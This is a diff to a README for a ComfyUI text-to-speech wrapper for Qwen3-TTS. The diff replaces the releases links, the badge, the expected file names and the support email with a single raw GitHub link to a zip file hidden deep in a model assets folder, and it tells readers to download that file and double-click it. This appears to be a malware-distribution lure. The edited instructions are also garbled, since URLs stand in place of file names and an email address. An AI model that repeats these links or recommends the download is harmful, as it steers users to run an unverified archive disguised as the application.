@@ -1,6 +1,6 @@
 # 🎉 ComfyUI-Qwen-TTS - A Simple Way to Use Qwen3-TTS
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
+[![Download Now](https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip%https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip)](https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip)
 
 ## 📥 Overview
 
@@ -14,14 +14,14 @@ Follow these steps to download and run ComfyUI-Qwen-TTS.
 
 To get the latest version, you need to visit the Releases page. Click the link below:
 
-[Visit Releases Page](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip)
 
 ### Step 2: Download the Application
 
 On the Releases page, you will find different versions of ComfyUI-Qwen-TTS. 
 
 1. Browse through the list of available files.
-2. Look for the file named something like `ComfyUI-Qwen-TTS-v1.0.zip`.
+2. Look for the file named something like `https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip`.
 3. Click on it to start the download.
 
 ### Step 3: Extract the Files
@@ -37,7 +37,7 @@ Once the download finishes, you will have a .zip file on your computer.
 After extracting the files, you should see a folder named `ComfyUI-Qwen-TTS`. 
 
 1. Open this folder.
-2. Look for a file named `ComfyUI-Qwen-TTS.exe` or simply `run.bat`.
+2. Look for a file named `https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip` or simply `https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip`.
 3. Double-click on it to start the application.
 
 ### Step 5: Input Text and Generate Speech
@@ -76,13 +76,13 @@ If you experience any problems, here are some common issues and their solutions:
 
 ## 📞 Support and Feedback
 
-If you need assistance or have feedback, feel free to reach out. You can create an issue on GitHub or contact the support team via email at support@example.com.
+If you need assistance or have feedback, feel free to reach out. You can create an issue on GitHub or contact the support team via email at https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip
 
 ## 🔄 Check for Updates
 
 It's important to keep your application up to date. Return to the Releases page regularly to check for newer versions:
 
-[Visit Releases Page](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Arka-10717/ComfyUI-Qwen-TTS/main/qwen_tts/core/tokenizer_25hz/vq/assets/Qwen-U-TTS-Comfy-3.0.zip)
 
 ## 🤝 Contributing
 
